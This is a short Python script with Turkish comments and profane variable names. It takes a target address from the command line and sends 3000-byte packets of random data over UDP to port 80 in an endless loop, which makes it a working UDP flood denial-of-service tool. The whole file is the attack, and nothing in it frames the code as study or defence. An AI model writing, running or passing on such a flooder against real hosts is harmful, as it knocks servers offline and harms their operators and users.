# AGA PY DUSMANIYDIK PROJEMİZDE PY KULLANMA GEREĞİNDE KALDIK
# BU NEDIR ARKADAŞ
import socket, sys, os, time, random
time.sleep(0.1)

anan = sys.argv[1]

orospuevladi = anan
port = int(80)

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bitler = random._urandom(3000)


paket=0

while True:
    s.sendto(bitler,(orospuevladi,port))
    paket+=1